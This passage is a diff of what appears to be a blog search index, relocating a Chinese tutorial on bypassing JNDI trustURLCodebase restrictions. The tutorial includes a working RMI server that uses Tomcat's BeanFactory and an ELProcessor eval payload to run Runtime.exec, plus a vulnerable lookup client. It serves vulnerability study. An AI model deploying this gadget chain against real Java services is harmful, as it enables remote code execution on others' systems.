@@ -1194,296 +1194,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JNDI高版本绕过</title>
-    <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
-<h2 id="需要绕过的原因分析"><a href="#需要绕过的原因分析" class="headerlink" title="需要绕过的原因分析"></a>需要绕过的原因分析</h2><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171223492.png"
-                      class="" title="image-20250314171223492"
-                > 
-
-<p>前面学习的时候我们发现需要将trustURLCodebase设置为true才可以进行漏洞利用，原因前面的文章有写</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171552126.png"
-                      class="" title="image-20250314171552126"
-                > 
-
-<p>但是我们现实环境中我们又不可能插入代码设置trustURLCodebase为true，所以就只能从前面两个判断中进行绕过<br>但是var8又是我们指定的类，所以没办法为null，能操作的地方就在*var8.getFactoryClassLocation()*这个地方了</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; //这个是我们利用的javax.el.ELProcessor这个类在里面</span><br><span class="line">      &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>tomcat的版本是有要求的，因为我们利用了他的forceString属性</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183149852.png"
-                      class="" title="image-20250314183149852"
-                > 
-
-<p>所以我们需要低于这些版本</p>
-<h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class BeanFactoryRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>windows下那个exec里面的命令好像需要改一下，根据自身条件判断，我的是macos，windows改成calc即可</p>
-<h3 id="尝试连接的客户端"><a href="#尝试连接的客户端" class="headerlink" title="尝试连接的客户端"></a>尝试连接的客户端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="绕过用的类分析"><a href="#绕过用的类分析" class="headerlink" title="绕过用的类分析"></a>绕过用的类分析</h2><p>我们使用了ResourceRef对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173241334.png"
-                      class="" title="image-20250314173241334"
-                > 
-
-<p>参考浅蓝师傅的文章</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314172459283.png"
-                      class="" title="image-20250314172459283"
-                > 
-<p>参考这个师傅的文章的图<a class="link"   href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943" >https://www.cnblogs.com/EddieMurphy-blogs/p/18078943<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
-<h3 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h3><p><strong>初步分析，这里看不懂很正常，我就举一下这里用到的两个类的关键的地方</strong></p>
-<p>看着我的步骤把后续的JNDI完整的链子跟完就知道这些关键点的用处了</p>
-<p>这个类的构造有三个关键的地方</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185156624.png"
-                      class="" title="image-20250314185156624"
-                > 
-
-<h4 id="factoryLocation为null"><a href="#factoryLocation为null" class="headerlink" title="factoryLocation为null"></a>factoryLocation为null</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185354274.png"
-                      class="" title="image-20250314185354274"
-                > 
-
-<p>获取了我们构造的ResourceRef对象，然后获取它的<strong>factoryLocation</strong> ，如果为null，那就绕过，执行else里面的return 后面的方法</p>
-<h4 id="factory为BeanFactory"><a href="#factory为BeanFactory" class="headerlink" title="factory为BeanFactory"></a>factory为BeanFactory</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185709179.png"
-                      class="" title="image-20250314185709179"
-                > 
-
-<p>从我们构造的ResourceRef中获取factoryClass，提取出了BeanFactory</p>
-<h4 id="resourceClass为漏洞利用的类"><a href="#resourceClass为漏洞利用的类" class="headerlink" title="resourceClass为漏洞利用的类"></a>resourceClass为漏洞利用的类</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185820880.png"
-                      class="" title="image-20250314185820880"
-                > 
-
-<p>factory为org.apache.naming.factory.BeanFactory，所以调用它的getObjectInstance方法</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185922046.png"
-                      class="" title="image-20250314185922046"
-                > 
-
-<p>这里他获取了ref就是我们的ResourceRef对象的class的name，就是我们resourceClass设置的<strong>javax.el.ELProcessor</strong> ，然后后续就是将这个<strong>javax.el.ELProcessor</strong> 给实例化然后利用反射去调用eval方法实现命令执行。</p>
-<h3 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><p>这个类我们先不看太多，流程跟着后面完整分析走就可以懂，就看一个关键的点。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190224659.png"
-                      class="" title="image-20250314190224659"
-                > 
-
-<p>获取了我们所需要用到的<strong>javax.el.ELProcessor</strong> 的类名</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190250894.png"
-                      class="" title="image-20250314190250894"
-                > 
-
-<p>把我们的类给实例化了存在bean参数里面</p>
-<p><strong>中间有一段获取方法以及参数的过程</strong> 流程后面有写</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190342664.png"
-                      class="" title="image-20250314190342664"
-                > 
-
-<p>反射调用命令执行。</p>
-<h2 id="JNDI绕过完整分析"><a href="#JNDI绕过完整分析" class="headerlink" title="JNDI绕过完整分析"></a>JNDI绕过完整分析</h2><p>看一下payload对应的参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173431977.png"
-                      class="" title="image-20250314173431977"
-                > 
-
-<p>可以观察到factoryLocation这个参数被设置为了null，就是为了绕过我们的JNDI的那个if判断</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173927228.png"
-                      class="" title="image-20250314173927228"
-                > 
-<p>然后还有forceString进行构造，我们可以打上断点进行跟踪</p>
-<h3 id="漏洞触发点分析"><a href="#漏洞触发点分析" class="headerlink" title="漏洞触发点分析"></a>漏洞触发点分析</h3><p>接下来分析的是，lookup()链子走的时候是怎么绕过前面说的trustURLCodebase的限制，以及怎么触发的实例化getObjectInstance方法。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183733704.png"
-                      class="" title="image-20250314183733704"
-                > 
-
-<p>进入deocdeObject</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183818414.png"
-                      class="" title="image-20250314183818414"
-                > 
-
-<p>提前看一下被限制的地方我们打上断点</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183851246.png"
-                      class="" title="image-20250314183851246"
-                > 
-
-<p>然后我们一步一步走</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183930238.png"
-                      class="" title="image-20250314183930238"
-                > 
-
-<p>var3是ResourceRef对象，且后续将它赋值给了var8</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184007058.png"
-                      class="" title="image-20250314184007058"
-                > 
-
-<p>然后进入判断的地方</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184020438.png"
-                      class="" title="image-20250314184020438"
-                > 
-
-<p>这里我们前面的payload设置为null的，所以可以绕过</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184052474.png"
-                      class="" title="image-20250314184052474"
-                > 
-
-<p>走到了我们实例化的地方，var3此时还是ResourceRef对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184424645.png"
-                      class="" title="image-20250314184424645"
-                > 
-
-<p>这里获取factoryClassName，然后进行操作</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184537599.png"
-                      class="" title="image-20250314184537599"
-                > 
-
-<p>漏洞触发点，这里构造成了<strong>org.apache.naming.factory.BeanFactory.getObjectInstance</strong> 就是我们上面写的地方</p>
-<h3 id="org-apache-naming-factory-BeanFactory-1"><a href="#org-apache-naming-factory-BeanFactory-1" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180259634.png"
-                      class="" title="image-20250314180259634"
-                > 
-
-<p>这里获取了我们要利用的类的类名</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180337115.png"
-                      class="" title="image-20250314180337115"
-                > 
-
-<p>然后将他加载</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180520260.png"
-                      class="" title="image-20250314180520260"
-                > 
-
-<p>将它实例化存储在bean里面</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314191103326.png"
-                      class="" title="image-20250314191103326"
-                > 
-
-<p>从forceString里面提取字符串a&#x3D;eval，然后提取为了param&#x3D;a，setterName&#x3D;eval</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180633736.png"
-                      class="" title="image-20250314180633736"
-                > 
-
-<p>跟进他这里的getMethod，因为此时我们的类在变量beanClass里，eval也是提取出来在setterName，没有拼接或者组合成<strong>javax.el.ELProcessor.eval()</strong> ,这里就是获取方法的地方，就像我们之前的<strong>类.getMethod(方法名,参数类型)</strong>  </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181503362.png"
-                      class="" title="image-20250314181503362"
-                > 
-
-<p>进行一个循环，要求右边那一列不为scope、auth、singletoken、forceString</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181638180.png"
-                      class="" title="image-20250314181638180"
-                > 
-
-<p>value就是获取的参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181734119.png"
-                      class="" title="image-20250314181734119"
-                > 
-
-<p>获取参数成功。</p>
-<p>这里就很眼熟了，method为方法，bean为对象，valueArray就是参数，利用反射去造成命令执行。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314175123674.png"
-                      class="" title="image-20250314175123674"
-                > 
-
-<p>计算器弹出成功。最后达成了类似<strong>eval.invoke(javax.el.ELProcessor,Runtime.getRuntime().exec(“open -a Calculator”))</strong></p>
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
-      <tags>
-        <tag>JNDI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Godzilla二次开发</title>
     <url>/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -2088,6 +1798,296 @@
       <tags>
         <tag>工具二次开发</tag>
         <tag>godzilla</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JNDI高版本绕过</title>
+    <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
+<h2 id="需要绕过的原因分析"><a href="#需要绕过的原因分析" class="headerlink" title="需要绕过的原因分析"></a>需要绕过的原因分析</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171223492.png"
+                      class="" title="image-20250314171223492"
+                > 
+
+<p>前面学习的时候我们发现需要将trustURLCodebase设置为true才可以进行漏洞利用，原因前面的文章有写</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171552126.png"
+                      class="" title="image-20250314171552126"
+                > 
+
+<p>但是我们现实环境中我们又不可能插入代码设置trustURLCodebase为true，所以就只能从前面两个判断中进行绕过<br>但是var8又是我们指定的类，所以没办法为null，能操作的地方就在*var8.getFactoryClassLocation()*这个地方了</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; //这个是我们利用的javax.el.ELProcessor这个类在里面</span><br><span class="line">      &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>tomcat的版本是有要求的，因为我们利用了他的forceString属性</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183149852.png"
+                      class="" title="image-20250314183149852"
+                > 
+
+<p>所以我们需要低于这些版本</p>
+<h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class BeanFactoryRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>windows下那个exec里面的命令好像需要改一下，根据自身条件判断，我的是macos，windows改成calc即可</p>
+<h3 id="尝试连接的客户端"><a href="#尝试连接的客户端" class="headerlink" title="尝试连接的客户端"></a>尝试连接的客户端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="绕过用的类分析"><a href="#绕过用的类分析" class="headerlink" title="绕过用的类分析"></a>绕过用的类分析</h2><p>我们使用了ResourceRef对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173241334.png"
+                      class="" title="image-20250314173241334"
+                > 
+
+<p>参考浅蓝师傅的文章</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314172459283.png"
+                      class="" title="image-20250314172459283"
+                > 
+<p>参考这个师傅的文章的图<a class="link"   href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943" >https://www.cnblogs.com/EddieMurphy-blogs/p/18078943<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<h3 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h3><p><strong>初步分析，这里看不懂很正常，我就举一下这里用到的两个类的关键的地方</strong></p>
+<p>看着我的步骤把后续的JNDI完整的链子跟完就知道这些关键点的用处了</p>
+<p>这个类的构造有三个关键的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185156624.png"
+                      class="" title="image-20250314185156624"
+                > 
+
+<h4 id="factoryLocation为null"><a href="#factoryLocation为null" class="headerlink" title="factoryLocation为null"></a>factoryLocation为null</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185354274.png"
+                      class="" title="image-20250314185354274"
+                > 
+
+<p>获取了我们构造的ResourceRef对象，然后获取它的<strong>factoryLocation</strong> ，如果为null，那就绕过，执行else里面的return 后面的方法</p>
+<h4 id="factory为BeanFactory"><a href="#factory为BeanFactory" class="headerlink" title="factory为BeanFactory"></a>factory为BeanFactory</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185709179.png"
+                      class="" title="image-20250314185709179"
+                > 
+
+<p>从我们构造的ResourceRef中获取factoryClass，提取出了BeanFactory</p>
+<h4 id="resourceClass为漏洞利用的类"><a href="#resourceClass为漏洞利用的类" class="headerlink" title="resourceClass为漏洞利用的类"></a>resourceClass为漏洞利用的类</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185820880.png"
+                      class="" title="image-20250314185820880"
+                > 
+
+<p>factory为org.apache.naming.factory.BeanFactory，所以调用它的getObjectInstance方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185922046.png"
+                      class="" title="image-20250314185922046"
+                > 
+
+<p>这里他获取了ref就是我们的ResourceRef对象的class的name，就是我们resourceClass设置的<strong>javax.el.ELProcessor</strong> ，然后后续就是将这个<strong>javax.el.ELProcessor</strong> 给实例化然后利用反射去调用eval方法实现命令执行。</p>
+<h3 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><p>这个类我们先不看太多，流程跟着后面完整分析走就可以懂，就看一个关键的点。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190224659.png"
+                      class="" title="image-20250314190224659"
+                > 
+
+<p>获取了我们所需要用到的<strong>javax.el.ELProcessor</strong> 的类名</p>
+<img  
+                     lazyload
